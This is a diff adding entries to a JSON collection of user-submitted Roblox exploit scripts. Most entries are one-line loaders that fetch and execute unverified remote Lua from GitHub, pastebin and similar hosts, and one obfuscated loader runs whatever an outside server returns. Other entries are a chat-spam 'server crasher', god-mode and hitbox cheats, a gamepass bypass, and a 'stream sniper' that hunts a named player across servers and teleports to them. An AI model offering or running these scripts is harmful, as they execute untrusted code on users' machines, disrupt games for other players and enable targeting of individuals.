@@ -2855,6 +2855,350 @@
       "Script_Title": "shift lock",
       "User_ID": 5281002288,
       "Username": "smsrtutb"
+    },
+    "Script462": {
+      "Date": "November 01 2024",
+      "Description": "Admin",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/Universal-Script-Ghost-Hub-9730\"))()",
+      "Script_Title": "Admin",
+      "User_ID": 4108042814,
+      "Username": "ower_zak"
+    },
+    "Script468": {
+      "Date": "November 01 2024",
+      "Description": "for all games",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VR7ss/OMK/main/VR7%20RAGDOLL\"))()",
+      "Script_Title": "for all games",
+      "User_ID": 7519684193,
+      "Username": "adi_666hackv3"
+    },
+    "Script469": {
+      "Date": "November 01 2024",
+      "Description": "Animation gui for R6 Games",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Animation-gui-9230\"))()",
+      "Script_Title": "Animation Gui",
+      "User_ID": 7194343033,
+      "Username": "nobodywantsabread"
+    },
+    "Script471": {
+      "Date": "November 02 2024",
+      "Description": "immortality",
+      "Script": "local player = game.Players.LocalPlayer\nlocal character = player.Character or player.CharacterAdded:Wait()\nlocal humanoid = character:WaitForChild(\"Humanoid\")\nhumanoid.MaxHealth = math.huge\nhumanoid.Health = humanoid.MaxHealth\nhumanoid:GetPropertyChangedSignal(\"Health\"):Connect(function()\n    humanoid.Health = humanoid.MaxHealth\nend)",
+      "Script_Title": "immortality",
+      "User_ID": 7483568758,
+      "Username": "ydt8foyxudcigv"
+    },
+    "Script472": {
+      "Date": "November 01 2024",
+      "Description": "gamepasses",
+      "Script": "if game.CreatorType == Enum.CreatorType.User then\ngame.Players.LocalPlayer.UserId = game.CreatorId\nend\nif game.CreatorType == Enum.CreatorType.Group then\ngame.Players.LocalPlayer.UserId = game:GetService(\"GroupService\"):GetGroupInfoAsync(game.CreatorId).Owner.Id\nend",
+      "Script_Title": "gamepasses",
+      "User_ID": 7454578803,
+      "Username": "Emilia_sij"
+    },
+    "Script473": {
+      "Date": "November 01 2024",
+      "Description": "this script is cool ",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/Brookhaven-RP-R4D-TROLL-NO-KEY-17625\"))()",
+      "Script_Title": "R4D Brookhaven ",
+      "User_ID": 5129431873,
+      "Username": "moderrnewhackgunba"
+    },
+    "Script474": {
+      "Date": "November 02 2024",
+      "Description": "😈😈😈😈😈😈😈",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/Dan41/Scripts/main/%5BCHAOS%5D%20CHAOTIC%20HUB.lua'),true))()",
+      "Script_Title": "CHOAS 🤔",
+      "User_ID": 5637311130,
+      "Username": "AniF_Xx"
+    },
+    "Script475": {
+      "Date": "November 01 2024",
+      "Description": "",
+      "Script": "local message = \"⛓                         \"\n\nwhile true do\n    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, \"All\")\n    \n    -- This pauses for 0.1 seconds before sending the next message\n    wait(0.1)\nend",
+      "Script_Title": "Server crasher",
+      "User_ID": 3793679368,
+      "Username": "shwkgweheg"
+    },
+    "Script476": {
+      "Date": "November 01 2024",
+      "Description": "GHOSTHUB❤️",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "Ghost Hub ❤",
+      "User_ID": 7279707308,
+      "Username": "sodaspxxls"
+    },
+    "Script477": {
+      "Date": "November 01 2024",
+      "Description": "I dont know If it works",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Kicksploit-12886\"))()",
+      "Script_Title": "Kick Gui",
+      "User_ID": 7517216337,
+      "Username": "Fynndeproobe2"
+    },
+    "Script478": {
+      "Date": "November 01 2024",
+      "Description": "Really fun",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-menu-c00lkidd-18800\"))()",
+      "Script_Title": "Cool kid Gui",
+      "User_ID": 7517216337,
+      "Username": "Fynndeproobe2"
+    },
+    "Script479": {
+      "Date": "November 02 2024",
+      "Description": "sm64",
+      "Script": "--Remove👆 if you don't want inf jump\n\nwhile true do\nlocal Animate = game.Players.LocalPlayer.Character.Animate\nAnimate.idle.Animation1.AnimationId = \"http://www.roblox.com/asset/?id=2510235063\"\nAnimate.idle.Animation2.AnimationId = \"http://www.roblox.com/asset/?id=2510235063\"\nAnimate.walk.WalkAnim.AnimationId = \"http://www.roblox.com/asset/?id=2510202577\"\nAnimate.run.RunAnim.AnimationId = \n\"http://www.roblox.com/asset/?id=4417979645\"\nAnimate.jump.JumpAnim.AnimationId = \"http://www.roblox.com/asset/?id=619528412\"\nAnimate.climb.ClimbAnim.AnimationId = \"http://www.roblox.com/asset/?id=742636889\"\nAnimate.fall.FallAnim.AnimationId = \"http://www.roblox.com/asset/?id=5319839762\"\ngame.Players.LocalPlayer.Character.Humanoid.Jump = false\ngame.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 26\ngame.Players.LocalPlayer.Character.FallDamageScript:Destroy()\ngame.Players.LocalPlayer.Character.Humanoid.JumpPower = 51\nwait(1)\nend",
+      "Script_Title": "mario",
+      "User_ID": 5489035874,
+      "Username": "player_harry6"
+    },
+    "Script483": {
+      "Date": "November 01 2024",
+      "Description": "قوست",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/2jbkJhRD'))()",
+      "Script_Title": "قوست",
+      "User_ID": 5247849615,
+      "Username": "Ha_san762"
+    },
+    "Script484": {
+      "Date": "November 01 2024",
+      "Description": "",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\ngetgenv().AutoReport = true\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/skibiditoiletfan2007/KadeHubRepository/main/Latest.lua\"))() ",
+      "Script_Title": "tsb script",
+      "User_ID": 2857407170,
+      "Username": "fadiamal13"
+    },
+    "Script485": {
+      "Date": "November 01 2024",
+      "Description": "key : Basketball8872Roblox!!",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/LOLking123456/Legends1/main/Ball\"))()",
+      "Script_Title": "Basketball lege",
+      "User_ID": 2252277672,
+      "Username": "XkillerSkelX"
+    },
+    "Script488": {
+      "Date": "November 02 2024",
+      "Description": "idk",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/tapboundcc/tapbound/main/camlock/by%20%23xvsfi'))()",
+      "Script_Title": "aimbot",
+      "User_ID": 3354676898,
+      "Username": "YOUTUNBG"
+    },
+    "Script489": {
+      "Date": "November 01 2024",
+      "Description": "Script delta-- ??? ",
+      "Script": "local Screenguini = Instance.new(\"ScreenGui\")\nlocal Frame = Instance.new(\"Frame\")\nlocal TextLabel = Instance.new(\"TextLabel\")\nlocal TextLabel_2 = Instance.new(\"TextLabel\")\nlocal UsernameBox = Instance.new(\"TextBox\")\nlocal TextLabel_3 = Instance.new(\"TextLabel\")\nlocal PlaceIdBox = Instance.new(\"TextBox\")\nlocal StartButton = Instance.new(\"TextButton\")\nlocal TextLabel_4 = Instance.new(\"TextLabel\")\nlocal UsernameLabel = Instance.new(\"TextLabel\")\nlocal TextLabel_5 = Instance.new(\"TextLabel\")\nlocal UserIdLabel = Instance.new(\"TextLabel\")\nlocal GamerPicture = Instance.new(\"ImageLabel\")\n\nlocal HttpService = game:GetService(\"HttpService\")\nlocal Players = game:GetService(\"Players\")\nlocal TeleportService = game:GetService(\"TeleportService\")\n\nScreenguini.Name = HttpService:GenerateGUID(false)\nScreenguini.Parent = game:GetService(\"CoreGui\")\n\nFrame.Parent = Screenguini\nFrame.Active = true\nFrame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nFrame.BorderColor3 = Color3.fromRGB(31, 31, 31)\nFrame.Draggable = true\nFrame.Size = UDim2.new(0, 400, 0, 260)\n\nTextLabel.Parent = Frame\nTextLabel.Active = true\nTextLabel.BackgroundColor3 = Color3.fromRGB(255, 170, 0)\nTextLabel.BorderColor3 = Color3.fromRGB(31, 31, 40)\nTextLabel.Size = UDim2.new(0, 400, 0, 40)\nTextLabel.Font = Enum.Font.SourceSansLight\nTextLabel.Text = \"Synapse X Stream Sniper\"\nTextLabel.TextSize = 24.000\n\nTextLabel_2.Parent = Frame\nTextLabel_2.Active = true\nTextLabel_2.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_2.BorderColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_2.Position = UDim2.new(0, 10, 0, 49)\nTextLabel_2.Size = UDim2.new(0, 150, 0, 20)\nTextLabel_2.Font = Enum.Font.SourceSansLight\nTextLabel_2.Text = \"Username/UserId:\"\nTextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)\nTextLabel_2.TextSize = 16.000\n\nUsernameBox.Name = \"UsernameBox\"\nUsernameBox.Parent = Frame\nUsernameBox.BackgroundColor3 = Color3.fromRGB(61, 61, 61)\nUsernameBox.BorderColor3 = Color3.fromRGB(31, 31, 31)\nUsernameBox.Position = UDim2.new(0, 10, 0, 80)\nUsernameBox.Size = UDim2.new(0, 150, 0, 35)\nUsernameBox.Font = Enum.Font.SourceSansLight\nUsernameBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)\nUsernameBox.PlaceholderText = \"Enter Username Here\"\nUsernameBox.Text = \"\"\nUsernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)\nUsernameBox.TextSize = 18.000\n\nTextLabel_3.Parent = Frame\nTextLabel_3.Active = true\nTextLabel_3.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_3.BorderColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_3.Position = UDim2.new(0, 10, 0, 130)\nTextLabel_3.Size = UDim2.new(0, 150, 0, 20)\nTextLabel_3.Font = Enum.Font.SourceSansLight\nTextLabel_3.Text = \"Place Id:\"\nTextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)\nTextLabel_3.TextSize = 16.000\n\nPlaceIdBox.Name = \"PlaceIdBox\"\nPlaceIdBox.Parent = Frame\nPlaceIdBox.BackgroundColor3 = Color3.fromRGB(61, 61, 61)\nPlaceIdBox.BorderColor3 = Color3.fromRGB(31, 31, 31)\nPlaceIdBox.Position = UDim2.new(0, 10, 0, 157)\nPlaceIdBox.Size = UDim2.new(0, 150, 0, 35)\nPlaceIdBox.Font = Enum.Font.SourceSansLight\nPlaceIdBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)\nPlaceIdBox.PlaceholderText = \"Enter PlaceId Here\"\nPlaceIdBox.Text = \"\"\nPlaceIdBox.TextColor3 = Color3.fromRGB(255, 255, 255)\nPlaceIdBox.TextSize = 18.000\n\nStartButton.Name = \"StartButton\"\nStartButton.Parent = Frame\nStartButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)\nStartButton.BorderColor3 = Color3.fromRGB(31, 31, 31)\nStartButton.Position = UDim2.new(0, 10, 0, 210)\nStartButton.Size = UDim2.new(0, 380, 0, 40)\nStartButton.Font = Enum.Font.SourceSansLight\nStartButton.Text = \"Start\"\nStartButton.TextColor3 = Color3.fromRGB(255, 255, 255)\nStartButton.TextSize = 24.000\n\nTextLabel_4.Parent = Frame\nTextLabel_4.Active = true\nTextLabel_4.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_4.BackgroundTransparency = 1.000\nTextLabel_4.BorderColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_4.Position = UDim2.new(0, 200, 0, 49)\nTextLabel_4.Size = UDim2.new(0, 0, 0, 20)\nTextLabel_4.AutomaticSize = Enum.AutomaticSize.X\nTextLabel_4.Font = Enum.Font.SourceSansBold\nTextLabel_4.Text = \"Username:\"\nTextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)\nTextLabel_4.TextSize = 16.000\nTextLabel_4.TextWrapped = true\nTextLabel_4.TextXAlignment = Enum.TextXAlignment.Left\n\nUsernameLabel.Name = \"UsernameLabel\"\nUsernameLabel.Parent = TextLabel_4\nUsernameLabel.Active = true\nUsernameLabel.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nUsernameLabel.BackgroundTransparency = 1.000\nUsernameLabel.BorderColor3 = Color3.fromRGB(31, 31, 31)\nUsernameLabel.Position = UDim2.new(0.5, 0, 0, 0)\nUsernameLabel.Size = UDim2.new(0, 150, 0, 20)\nUsernameLabel.Font = Enum.Font.SourceSansLight\nUsernameLabel.Text = \"\"\nUsernameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nUsernameLabel.TextSize = 16.000\nUsernameLabel.TextXAlignment = Enum.TextXAlignment.Left\n\nTextLabel_5.Parent = Frame\nTextLabel_5.Active = true\nTextLabel_5.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_5.BackgroundTransparency = 1.000\nTextLabel_5.BorderColor3 = Color3.fromRGB(31, 31, 31)\nTextLabel_5.Position = UDim2.new(0, 200, 0, 69)\nTextLabel_5.Size = UDim2.new(0, 0, 0, 20)\nTextLabel_5.AutomaticSize = Enum.AutomaticSize.X\nTextLabel_5.Font = Enum.Font.SourceSansBold\nTextLabel_5.Text = \"UserId:\"\nTextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)\nTextLabel_5.TextSize = 16.000\nTextLabel_5.TextWrapped = true\nTextLabel_5.TextXAlignment = Enum.TextXAlignment.Left\n\nUserIdLabel.Name = \"UserIdLabel\"\nUserIdLabel.Parent = TextLabel_5\nUserIdLabel.Active = true\nUserIdLabel.BackgroundColor3 = Color3.fromRGB(31, 31, 31)\nUserIdLabel.BackgroundTransparency = 1.000\nUserIdLabel.BorderColor3 = Color3.fromRGB(31, 31, 31)\nUserIdLabel.Position = UDim2.new(0.5, 0, 0, 0)\nUserIdLabel.Size = UDim2.new(0, 150, 0, 20)\nUserIdLabel.Font = Enum.Font.SourceSansLight\nUserIdLabel.Text = \"\"\nUserIdLabel.TextColor3 = Color3.fromRGB(255, 255, 255)\nUserIdLabel.TextSize = 16.000\nUserIdLabel.TextXAlignment = Enum.TextXAlignment.Left\n\nGamerPicture.Name = \"GamerPicture\"\nGamerPicture.Parent = Frame\nGamerPicture.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\nGamerPicture.Position = UDim2.new(0, 200, 0, 95)\nGamerPicture.Size = UDim2.new(0, 97, 0, 97)\nGamerPicture.Image = \"rbxasset://textures/ui/GuiImagePlaceholder.png\"\n\nif shared.STREAM_SNIPER then\n   shared.STREAM_SNIPER:Destroy()\nend\nshared.STREAM_SNIPER = Screenguini\n\nlocal searching = false\nlocal confirm = false\n\nlocal function HttpGet(url)\nreturn pcall(HttpService.JSONDecode, HttpService, game:HttpGet(url))\nend\n\nlocal function Status(text, tout)\nStartButton.Text = text\n\n   if tout then\n       task.delay(tout, function()\n           if StartButton.Text == text then\n               searching = false\n               StartButton.Text = \"Start\"    \n           end\n       end)\n   end\nend\n\nlocal function getServers(id, cursor)\n   local fullurl = \"https://games.roblox.com/v1/games/\".. id ..\"/servers/Public?limit=100\"\n   if cursor then\n       fullurl = \"&cursor=\".. cursor\n   end\n\n   return HttpGet(fullurl)\nend\n\nlocal function fetchThumbs(tokens)\n   local payload = {\n       Url = \"https://thumbnails.roblox.com/v1/batch\",\n       Headers = {\n           [\"Content-Type\"] = \"application/json\"\n       },\n       Method = \"POST\",\n\n       Body = {}\n   }\n\n   for _, token in ipairs(tokens) do\n       table.insert(payload.Body, {\n           requestId = \"0:\".. token ..\":AvatarHeadshot:150x150:png:regular\",\n           type = \"AvatarHeadShot\",\n           targetId = 0,\n           token = token,\n           format = \"png\",\n           size = \"150x150\"\n       })\n   end\n\n   payload.Body = HttpService:JSONEncode(payload.Body)\n   local result = syn.request(payload)\n   local s, data = pcall(HttpService.JSONDecode, HttpService, result.Body)\n   return s, data and data.data or data\nend\n\nlocal function teleport(placeId, guid)\n   TeleportService:TeleportToPlaceInstance(placeId, guid)\nend\n\n\nlocal threads = 30\n\nStartButton.MouseButton1Click:Connect(function()\n   if confirm then\n       confirm = false\n       searching = false\n       Status(\"Cancelled\")\n       return\n   end\n\n   if searching then\n       confirm = true\n       local old = StartButton.Text\n       Status(\"Click again to confirm.\")\n       task.delay(5, function()\n           if \"Click again to confirm.\" == StartButton.Text then\n               confirm = false\n               StartButton.Text = old\n           end\n       end)\n       return\n   end\n\n   searching = true\n\n   -- User ID\n   Status(\"Getting user id...\")\n\n   local s, Username, UserId = pcall(function() -- TODO FIX: fix for only numbers players\n       local userId = tonumber(UsernameBox.Text) or Players:GetUserIdFromNameAsync(UsernameBox.Text)\n       local username = Players:GetNameFromUserIdAsync(userId)\n\nreturn username, userId\nend)\n\nif not s then\nreturn Status(\"Username or UserId does not exist!\", 3)\nend\n\n   local s, thumbUrl = pcall(Players.GetUserThumbnailAsync, Players, UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150)\n\n   UsernameLabel.Text = Username\n   UserIdLabel.Text = UserId\n   GamerPicture.Image = s and thumbUrl or \"\"\n\n   Status(\"Getting user's thumbnail...\")\n   local s, response = HttpGet(\"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=\" .. UserId .. \"&format=Png&size=150x150&isCircular=false\")\n   --local s, response = HttpGet(\"https://www.roblox.com/headshot-thumbnail/json?userId=\" .. UserId .. \"&width=150&height=150\")\n   local thumbnail = s and response['data'][1].imageUrl\n\n   Status(\"Searching for (\".. UserId ..\")\")\n   \n   -- Place ID\n   Status(\"Getting place id...\")\n   \n   local placeId = tonumber(PlaceIdBox.Text)\n\n   if PlaceIdBox.Text:gsub(\"%s\", \"\") == \"\" then\n       placeId = game.PlaceId\n\n   elseif not placeId then\n       Status(\"Invalid place id\", 3)\n       return\n   end\n   \n   Status(\"Searching...\")\n   local cursor = nil\n   local searched = 0\n   local maxSearchs = 0\n   local players = 0\n   -- Server search\n   while searching do\n       if not Screenguini or not Screenguini.Parent then\n           break\n       end\n       local s, result = getServers(placeId, cursor)\n\n       if s then\n           local servers = result.data\n           cursor = result.nextPageCursor\n           \n           if StartButton.Text:match(\"Searching\") then\n               maxSearchs = maxSearchs + #servers\n               Status(searched ..\"/\".. maxSearchs ..\" servers scanned, players found: \".. players)\n           end\n\n           -- Search all servers\n           for index, server in ipairs(servers) do\n               local function fetchServer()\n                   local s, thumbs = fetchThumbs(server.playerTokens)\n                   if s then\n                       players = players + #thumbs\n                       for _, playerThumb in ipairs(thumbs) do\n                           if playerThumb.imageUrl then\n                               if playerThumb.imageUrl == thumbnail then\n                                   searching = false\n                                   Status(\"Found player, teleporting...\")\n\n                                   teleport(placeId, server.id)\n                                   local try = 0\n                                   Player.OnTeleport:Connect(function(teleportState)\n                                       if teleportState == Enum.TeleportState.Failed then\n                                           try = try + 1\n                                           Status(\"Teleport failed, try #\".. try)\n                                           teleport(placeId, server.id)\n                                       end\n                                   end)\n                               end\n                           else\n                               Status(\"token failed, id:\", playerThumb.requestId, playerThumb.state, playerThumb.errorMessage)\n                               --print(\"token failed, id:\", playerThumb.requestId, playerThumb.state, playerThumb.errorMessage)\n                           end\n                       end\n                   else\n                       Status(\"token failed\", s, thumb)\n                       --print(\"token failed\", s, thumbs)\n                   end\n               end\n               searched = searched + 1\n               if index % threads ~= 0 then\n                   task.spawn(fetchServer)\n                   task.wait()\n\n               else\n                   fetchServer()\n               end\n\n               if searching then\n                   Status(searched ..\"/\".. maxSearchs ..\" servers scanned, players found: \".. players)\n               end\n           end\n           \n           -- Player not found\n           if not cursor then\n               break\n           end\n       else\n           return Status(\"Failed to find servers\", 3)\n       end\n\n       task.wait()\n   end\n   \n   if searching then\n       Status(\"Failed to find \".. Username ..\", maybe in a vip server\", 3)\n   end\nend)",
+      "Script_Title": "HX47 strem",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script491": {
+      "Date": "November 01 2024",
+      "Description": "EXEPLOT REAL SNIP FF KEY SORR IS KEY",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/Sniper.lua\"))()",
+      "Script_Title": "HX47 Snip KEY R",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script492": {
+      "Date": "November 01 2024",
+      "Description": "Brockhaven",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Ndora1/Ndora1/main/Nokia%20Hub.lua'))()",
+      "Script_Title": "BROCKHAVEN ",
+      "User_ID": 7497028130,
+      "Username": "rayen121237"
+    },
+    "Script493": {
+      "Date": "November 01 2024",
+      "Description": "by: Ghost hub",
+      "Script": "loadstring(jogo:HttpGet(\"https://raw.githubusercontent.com/StenDirt/Trash-Game/main/Script.lua\"))()",
+      "Script_Title": "build a boate c",
+      "User_ID": 4996322678,
+      "Username": "yurigamercan_666"
+    },
+    "Script494": {
+      "Date": "November 01 2024",
+      "Description": "fun",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/hussain1323232234/My-Scripts/main/Street%20Soccer'))()",
+      "Script_Title": "tps reach",
+      "User_ID": 5368936240,
+      "Username": "kmf_41"
+    },
+    "Script495": {
+      "Date": "November 01 2024",
+      "Description": "bang",
+      "Script": " loadstring(game:HttpGet(\"https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua\"))()",
+      "Script_Title": "bang  and face",
+      "User_ID": 5368936240,
+      "Username": "kmf_41"
+    },
+    "Script497": {
+      "Date": "November 01 2024",
+      "Description": "MK TEST",
+      "Script": "loadstring(jogo:HttpGet('https://pastebin.com/raw/Fj8KWmLC'))()",
+      "Script_Title": "item giver v2",
+      "User_ID": 4996322678,
+      "Username": "yurigamercan_666"
+    },
+    "Script498": {
+      "Date": "November 01 2024",
+      "Description": ".",
+      "Script": "loadstring(game:HttpGet(\"https://dpaste.com/CMGU6RSJW.txt\",true))()",
+      "Script_Title": "script :]",
+      "User_ID": 7314935098,
+      "Username": "Yodemon_star99"
+    },
+    "Script499": {
+      "Date": "November 01 2024",
+      "Description": "unix hub 💀",
+      "Script": "--[[\n\tWARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\n-- pls join our discord server, we have many cool scripts! =)\n-- https://discord.gg/C4KjZkZ5NH\n \nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/unixetp/unixhub/refs/heads/main/script\"))()",
+      "Script_Title": "unix hub 💀",
+      "User_ID": 5051894519,
+      "Username": "ZEZE_MANGA0"
+    },
+    "Script500": {
+      "Date": "November 01 2024",
+      "Description": "script pra 25 jogos blox fruit Brookhaven rp e muito mais :)  ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-gui-Hub-for-25-games-15196\"))()",
+      "Script_Title": "gui hub for 25 ",
+      "User_ID": 5051894519,
+      "Username": "ZEZE_MANGA0"
+    },
+    "Script501": {
+      "Date": "November 01 2024",
+      "Description": "blox fruit 💀",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Blox-Fruits-w-azure-hub-10114\"))()",
+      "Script_Title": "W azure",
+      "User_ID": 5051894519,
+      "Username": "ZEZE_MANGA0"
+    },
+    "Script502": {
+      "Date": "November 01 2024",
+      "Description": "este script es simple no tiene tantas funciones pero esta bueno",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Rake-REMASTERED-LynX-v2-5347\"))()",
+      "Script_Title": "the rake",
+      "User_ID": 3911128262,
+      "Username": "ElTizi_XD11"
+    },
+    "Script504": {
+      "Date": "November 01 2024",
+      "Description": "mm2",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2\"))()",
+      "Script_Title": "somethin cool",
+      "User_ID": 7177702472,
+      "Username": "TestingExecutors38"
+    },
+    "Script505": {
+      "Date": "November 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/main/Verbalhub.lua\",true))()",
+      "Script_Title": "verbal hub",
+      "User_ID": 5524768342,
+      "Username": "test_accounting4"
+    },
+    "Script506": {
+      "Date": "November 01 2024",
+      "Description": "xd",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()",
+      "Script_Title": "R4D",
+      "User_ID": 5853984912,
+      "Username": "Anerobits"
+    },
+    "Script507": {
+      "Date": "November 01 2024",
+      "Description": "xd",
+      "Script": "getgenv().mainKey = \"nil\"   local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,\"https://api.eclipsehub.xyz/auth\"c(a and b,\"Executor not Supported\")a(b({Url=e..\"\\?\\107e\\121\\61\"..d(mainKey),Headers={[\"User-Agent\"]=\"Eclipse\"}}).Body)()",
+      "Script_Title": "Eclipse Hub",
+      "User_ID": 5853984912,
+      "Username": "Anerobits"
+    },
+    "Script509": {
+      "Date": "November 01 2024",
+      "Description": "This is a quiz bot. it shows the script that it can become like a gameshow host.",
+      "Script": "\nlocal CategoryManager = loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Damian-11/quizbot/master/quizbot.luau\"))()",
+      "Script_Title": "Quiz bot",
+      "User_ID": 5571682010,
+      "Username": "Themasterplayer024"
+    },
+    "Script513": {
+      "Date": "November 02 2024",
+      "Description": "",
+      "Script": "_G.Team = \"Pirate\" --Pirate or Marine\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/KOBENFF/sdfd/refs/heads/main/Koatta.txt\"))()",
+      "Script_Title": "blxfruit ",
+      "User_ID": 4268157890,
+      "Username": "48_057"
+    },
+    "Script515": {
+      "Date": "November 02 2024",
+      "Description": "universal script made by duranto_ghostboy",
+      "Script": "loadstring(game:HttpGet(('https://pastefy.app/Oic24KzG/raw'),true))()",
+      "Script_Title": "all game script",
+      "User_ID": 44221818,
+      "Username": "duranto_ghostboy"
+    },
+    "Script516": {
+      "Date": "November 01 2024",
+      "Description": "シ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Doors-floor-2-Native-18047\"))()",
+      "Script_Title": "doors floor 2",
+      "User_ID": 4831462122,
+      "Username": "pft_7"
+    },
+    "Script518": {
+      "Date": "November 02 2024",
+      "Description": "script for brookhaven",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB\"))()",
+      "Script_Title": "Redzhub brokhav",
+      "User_ID": 4884644892,
+      "Username": "yoseph111u"
+    },
+    "Script520": {
+      "Date": "November 02 2024",
+      "Description": "shiftlock permanent all games",
+      "Script": "--[[\n    WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!\n]]\nloadstring(game:HttpGet('https://pastebin.com/raw/CjNsnSDy'))()",
+      "Script_Title": "Permanent shift",
+      "User_ID": 4884644892,
+      "Username": "yoseph111u"
+    },
+    "Script521": {
+      "Date": "November 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB\"))()",
+      "Script_Title": "brookhave op",
+      "User_ID": 7533186581,
+      "Username": "Hee_Kuybighaha"
+    },
+    "Script526": {
+      "Date": "November 02 2024",
+      "Description": "Ftap but the key is : sigmahub",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/VerbalHubz/Verbal-Hub/main/Verbalhub.lua\",true))()",
+      "Script_Title": "FTAP might be",
+      "User_ID": 4526253520,
+      "Username": "ban_kick66"
+    },
+    "Script527": {
+      "Date": "November 02 2024",
+      "Description": "kill npc",
+      "Script": "```\n-- Settings\nlocal npcModelName = \"NPC\" -- Model name of the NPC\nlocal killRange = 1000 -- Distance to kill the  NPC\nlocal killDelay = 1 -- Delay time between kills (in seconds) \n\n-- Function to kill the NPC\nlocal function killNPC(npc)\n    if npc.Humanoid then\n        npc.Humanoid:TakeDamage(100) -- Causes enough damage to kill the NPC\n    end\nend\n\n-- Search for NPCS nearby\nwhile true do\n    for _, npc in pairs(workspace:GetDescendants()) do\n        if npc.Name == npcModelName and npc:IsA(\"Model\") then\n            local distance = (npc.PrimaryPart.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Magnitude\n            if distance <= killRange then\n                killNPC(npc)\n            end\n        end\n    end\n    wait(killDelay)\nend\n``",
+      "Script_Title": "test",
+      "User_ID": 3136003296,
+      "Username": "jdjejrjr4irif"
+    },
+    "Script528": {
+      "Date": "November 02 2024",
+      "Description": "best hitbox by me",
+      "Script": "_G.HeadSize = 20\n_G.Disabled = true\n \ngame:GetService('RunService').RenderStepped:connect(function()\nif _G.Disabled then\nfor i,v in next, game:GetService('Players'):GetPlayers() do\nif v.Name ~= game:GetService('Players').LocalPlayer.Name then\npcall(function()\nv.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)\nv.Character.HumanoidRootPart.Transparency = 0.7\nv.Character.HumanoidRootPart.BrickColor = BrickColor.new(\"Really blue\")\nv.Character.HumanoidRootPart.Material = \"Neon\"\nv.Character.HumanoidRootPart.CanCollide = false\nend)\nend\nend\nend\nend)",
+      "Script_Title": "best hit box ",
+      "User_ID": 7532257806,
+      "Username": "TEST_44671"
+    },
+    "Script533": {
+      "Date": "November 02 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Kitzoon/Rogue-Hub/main/Main.lua\", true))()",
+      "Script_Title": "slap battles",
+      "User_ID": 7533628019,
+      "Username": "one_moreShotcuz"
     }
   }
 }
